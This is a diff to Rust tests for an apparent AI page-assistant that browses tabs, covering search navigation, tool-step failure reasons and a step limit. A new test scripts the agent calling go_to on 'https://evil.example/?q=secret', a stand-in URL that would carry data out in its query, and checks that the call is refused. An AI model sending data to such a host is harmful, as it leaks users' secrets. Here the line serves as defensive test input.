@@ -333,6 +333,12 @@ impl Settings for Switch {
 
 struct FakeTabs(Mutex<Vec<String>>, Arc<FakePage>);
 impl Tabs for FakeTabs {
+    fn search_url(&self, _profile: &ProfileId, query: &str) -> Option<String> {
+        Some(format!(
+            "https://duckduckgo.com/?q={}",
+            query.replace(' ', "+")
+        ))
+    }
     fn profile(&self, space: &str) -> Option<ProfileId> {
         (space == SPACE).then(profile)
     }
@@ -356,11 +362,27 @@ impl Tabs for FakeTabs {
         _space: &'a str,
         url: &'a str,
         _after: Option<&'a str>,
+        _focus: bool,
     ) -> BoxFuture<'a, Option<String>> {
         let mut opened = self.0.lock().unwrap();
         opened.push(url.to_owned());
         let id = format!("new-{}", opened.len());
-        self.1.lock().facts.insert(id.clone(), facts(url));
+        let mut page = self.1.lock();
+        page.facts.insert(id.clone(), facts(url));
+        page.readouts.insert(
+            id.clone(),
+            Readout {
+                epoch: 1,
+                read: 0,
+                title: Some("Results".into()),
+                passages: vec![link(
+                    1,
+                    "Rust (programming language)",
+                    "https://en.wikipedia.org/wiki/Rust",
+                )],
+            },
+        );
+        drop(page);
         Box::pin(async move { Some(id) })
     }
 }
@@ -755,7 +777,7 @@ async fn an_answer_streams_with_cites_from_the_page_and_is_stored() {
         request.max_output_tokens >= 8_000,
         "room to think and still write"
     );
-    assert_eq!(request.tools.len(), 8);
+    assert_eq!(request.tools.len(), 9);
     assert!(h
         .request_text(0)
         .contains("<<<PAGE a\nhost: news.ycombinator.com"));
@@ -1298,14 +1320,18 @@ async fn a_failed_step_says_why_and_names_its_target() {
         panic!()
     };
     assert_eq!(steps[0].state, PageAssistStepStateV1::Failed);
-    assert_eq!(steps[0].reason, Some(PageAssistStepReasonV1::Refused));
+    assert_eq!(
+        steps[0].reason,
+        Some(PageAssistStepReasonV1::Unsuitable),
+        "typing into a link is unsuitable, not refused"
+    );
     assert!(
         steps[0].label.starts_with("Type “x” into “eMudhra"),
         "{}",
         steps[0].label
     );
     let (result, _) = h.tool_result(1);
-    assert!(result.contains("refused"), "{result}");
+    assert!(result.contains("not a control"), "{result}");
 }
 
 #[tokio::test]
@@ -1326,4 +1352,44 @@ async fn the_log_carries_counts_and_names_never_page_or_model_text() {
     for secret in ["eMudhra", "stands out", "worth reading", PASSWORD] {
         assert!(!notes.contains(secret), "{secret} leaked into the log");
     }
+}
+
+#[tokio::test]
+async fn go_to_searches_opens_in_front_and_reads_the_page() {
+    let h = harness(vec![
+        tool(
+            "go_to",
+            json!({"target": "search: rust programming language wikipedia"}),
+        ),
+        tool("go_to", json!({"target": "https://evil.example/?q=secret"})),
+        say("Opened the search."),
+    ]);
+    h.ask("Open Wikipedia's page on Rust", false).await.unwrap();
+    h.settle().await;
+    assert_eq!(
+        *h.tabs.0.lock().unwrap(),
+        vec!["https://duckduckgo.com/?q=rust+programming+language+wikipedia"]
+    );
+    let (result, _) = h.tool_result(1);
+    assert!(
+        result.starts_with("Opened duckduckgo.com in front as t1.\n<<<PAGE a"),
+        "{result}"
+    );
+    let (refused, is_error) = h.tool_result(2);
+    assert!(is_error && refused.contains("search:"), "{refused}");
+}
+
+#[tokio::test]
+async fn a_long_job_ends_with_words_instead_of_silence() {
+    let mut turns: Vec<Turn> = (0..15).map(|_| tool("list_tabs", json!({}))).collect();
+    turns.push(say("I listed your tabs but ran out of steps."));
+    let h = harness(turns);
+    h.ask("Do many things", false).await.unwrap();
+    h.settle().await;
+    assert_eq!(h.requests().len(), 16);
+    assert!(h.request_text(15).contains("Stop using tools now."));
+    assert_eq!(
+        text_of(&h.blocks().await),
+        "I listed your tabs but ran out of steps."
+    );
 }
